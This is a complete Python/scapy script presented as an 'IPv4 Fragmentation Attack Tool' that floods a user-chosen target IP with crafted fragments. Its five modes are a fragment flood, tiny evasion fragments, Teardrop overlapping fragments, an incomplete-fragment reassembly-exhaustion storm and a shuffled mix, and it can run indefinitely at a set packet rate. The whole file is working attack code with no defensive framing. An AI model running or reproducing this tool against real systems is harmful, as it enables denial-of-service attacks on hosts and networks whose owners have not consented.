#!/usr/bin/env python3
from scapy.all import *
import time
import sys
import os
from datetime import datetime
import random

def print_banner():
    print("="*80)
    print("          IPv4 FRAGMENTATION ATTACK TOOL - v2")
    print("="*80)

def get_config():
    print("\n=== Attack Configuration ===")
    dst = input("Target IP [192.168.0.107]: ").strip() or "192.168.0.107"
    
    print("\nAttack Modes:")
    print("1. High-Rate Fragment Flood")
    print("2. Tiny Fragments (Evasion)")
    print("3. Teardrop (Overlapping - Classic)")
    print("4. Incomplete Fragment Storm (Reassembly Exhaustion)")
    print("5. Random Mixed Fragment Attack")
    
    mode = int(input("Choose mode (1-5) [3]: ") or 3)
    pps = int(input("Packets per second [500]: ") or 500)
    duration = int(input("Duration in seconds (0 = infinite) [0]: ") or 0)
    
    return dst, mode, pps, duration

def build_fragments(dst, mode):
    ident = random.randint(1000, 65535)
    data = b"A" * 1420  # Larger payload
    
    if mode == 1:   # High Rate
        return fragment(IP(dst=dst, id=ident)/ICMP(type="echo-request")/Raw(load=data), fragsize=512)
    
    elif mode == 2: # Tiny
        return fragment(IP(dst=dst, id=ident)/ICMP(type="echo-request")/Raw(load=data), fragsize=8)
    
    elif mode == 3: # Teardrop (Overlapping)
        frags = []
        frags.append(IP(dst=dst, id=ident, flags="MF", frag=0)   / data[0:100])
        frags.append(IP(dst=dst, id=ident, flags="MF", frag=8)   / data[60:180])   # Overlap
        frags.append(IP(dst=dst, id=ident, flags=0,   frag=20)  / data[140:])
        return frags
    
    elif mode == 4: # Incomplete Storm
        return [IP(dst=dst, id=ident, flags="MF", frag=0) / Raw(load=data[:800])]
    
    elif mode == 5: # Mixed Chaos
        frags = fragment(IP(dst=dst, id=ident)/Raw(load=data), fragsize=200)
        random.shuffle(frags)
        return frags

def launch_attack():
    print_banner()
    if os.geteuid() != 0:
        print("[-] Run with sudo!")
        sys.exit(1)

    dst, mode, pps, duration = get_config()
    
    print(f"\n[+] Launching IPv4 Fragmentation Attack → {dst}")
    print(f"[+] Mode: {mode} | Rate: {pps} pps | Duration: {'Infinite' if duration == 0 else duration}s")
    print("[!] Ctrl+C to stop\n")
    
    start = time.time()
    total = 0
    
    try:
        while True:
            if duration > 0 and (time.time() - start) > duration:
                break
                
            frags = build_fragments(dst, mode)
            for f in frags:
                send(f, verbose=False)
                total += 1
            
            time.sleep(1.0 / pps)
            
            if total % (pps * 3) == 0:
                elapsed = time.time() - start
                print(f"[+] Sent {total:,} fragments | Rate: {total/elapsed:.0f} frags/sec | Time: {elapsed:.1f}s", end="\r")
                
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user.")
    finally:
        elapsed = time.time() - start
        print(f"\n\n[+] Attack Completed!")
        print(f"    Total fragments sent : {total:,}")
        print(f"    Duration             : {elapsed:.2f} seconds")
        print(f"    Average rate         : {total/elapsed:.1f} fragments/sec")

if __name__ == "__main__":
    launch_attack()